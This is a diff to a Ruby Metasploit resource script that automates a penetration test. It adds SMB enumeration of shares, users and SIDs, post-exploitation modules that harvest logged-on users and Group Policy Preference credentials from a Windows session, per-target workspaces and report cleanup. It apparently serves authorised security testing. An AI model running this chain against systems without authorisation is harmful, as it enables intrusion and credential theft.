@@ -472,6 +472,76 @@ if ($?.success?)
 end
 end
 
+# Windows services tests
+def smb(target)
+# smb_version determines the version of the SMB service that is running
+run_single("setg RHOST #{target}")
+run_single("use auxiliary/scanner/smb/smb_version")
+run_single("run")
+run_single("back")
+
+# pipe_auditor determine what named pipes are available over SMB:
+run_single("use auxiliary/scanner/smb/pipe_auditor")
+run_single("run")
+run_single("back")
+
+# pipe_dcerpc_auditor return the DCERPC services that can be accessed via a SMB
+run_single("use auxiliary/scanner/smb/pipe_dcerpc_auditor")
+run_single("run")
+run_single("back")
+
+# smb2 determines if target supports the SMB2 protocol.
+run_single("use auxiliary/scanner/smb/smb2")
+run_single("run")
+run_single("back")
+
+# smb_enumshares enumerates any SMB shares available
+run_single("use auxiliary/scanner/smb/smb_enumshares")
+run_single("run")
+run_single("back")
+
+# smb_enumusers numerate the users on the target via SMB RPC service
+run_single("use auxiliary/scanner/smb/smb_enumusers")
+run_single("run")
+run_single("back")
+
+# smb_lookupsid brute-forces SID lookups on target to determine what local users exist the system
+run_single("use auxiliary/scanner/smb/smb_lookupsid")
+run_single("run")
+run_single("back")
+end
+
+# After windows exploitation, enumerate his resources
+def postenum()
+if (framework.sessions.length <= 0)
+      # Enumerate all logged on users
+      run_single("use post/windows/gather/enum_logged_on_users")
+      run_single("set SESSION 1")
+      run_single("exploit")
+      run_single("back")
+      # Gather All Group Policy Preference
+      run_single("use post/windows/gather/credentials/gpp")
+      run_single("set SESSION 1")
+      run_single("exploit")
+      run_single("back")
+      # Find All Services in Server
+      run_single("use post/windows/gather/enum_services")
+      run_single("set SESSION 1")
+      run_single("exploit")
+      run_single("back")
+      # Find All Installed Applications in Server
+      run_single("use post/windows/gather/enum_applications")
+      run_single("set SESSION 1")
+      run_single("exploit")
+      run_single("back")
+      # Find All Remote Desktop Sessions
+      run_single("use post/windows/gather/enum_termserv")
+      run_single("set SESSION 1")
+      run_single("exploit")
+      run_single("back")      
+end
+end 
+
 # wordlists
 pathdefault = "/usr/share/metasploit-framework/data/wordlists/"
 print_line("The user and password lists already been set, but you can adjust to yours...")
@@ -517,6 +587,10 @@ run_single("load pentest")
 Dir.chdir('/root')
 File.foreach(path) { |each|
 File.open(path, 'r') {|file| line=file.gets; remains=file.read}
+# Creating workspace
+  run_single("workspace -a #{line}")
+  run_single("workspace #{line}")  
+# Define target's IP
   run_single("setg RHOSTS #{line}")
   run_single("db_nmap #{line} -sS -O")
   sleep 10
@@ -661,23 +735,30 @@ if (framework.sessions.length > 0)
     end
 end
 
+# Call smb() & postenum() functions
+framework.db.hosts.each do |host|
+ if (host.os_name =~ /[Ww]indows/)
+     host.services.each do |serv|
+       if (serv.state == Msf::ServiceState::Open)
+	     if ((serv.port.to_i == 445) or (serv.port.to_i == 139))
+            	smb("#{line}")
+		postenum()
+	     end
+        end
+      end
+    end
+end
+
 # Generate a XML report if there are some open session
-# bug
 if (framework.sessions.length > 0)
 	run_single("db_export -f xml -a /root/#{line}.xml")
-print_line("criou xml")
 	bruteforce(line)
-print_line("terminou brute")
 	line="#{line}".chomp
 
-
 # To create PDF reports, install Apache's FOP from https://xmlgraphics.apache.org/fop/download.html on /opt
-# bug
 if ($?.success?)
 	run_single("xsltproc --output /root/#{line}.fo --stringparam fop1.extensions 1 /root/metasploitReportTemplate.xsl /root/#{line}.xml")
-print_line("criou fop")
 	run_single("/opt/fop-2.3/fop/fop /root/#{line}.fo /root/#{line}.pdf")
-print_line("criou pdf")
 end
 
 # Send PDF report to email with reportEmail plugin
@@ -685,11 +766,11 @@ if ($?.success?)
 	run_single("reportEmail #{line}")
 end
 
-# bug
-#if ($?.success?)
-#	File.delete("/root/#{line}.xml")
-#	File.delete("/root/#{line}.fo")
-#end
+
+if ($?.success?)
+	File.delete("/root/#{line}.xml")
+	File.delete("/root/#{line}.fo")
+end
 end
 
 # If LDAP or AD user file exist, remove it
@@ -702,12 +783,9 @@ run_single("sessions -K")
 framework.db.hosts.each do |host|
 if (host.address != nil || host.address != 0)
 	run_single("hosts -d")
-# bug
-#	while ($?.exitstatus != 0)
-#		run_single("hosts -d")
-#	end
 end
 end
+run_single("workspace -d #{line}")
 
 # after this host, back to original userfile
 if (userfile)
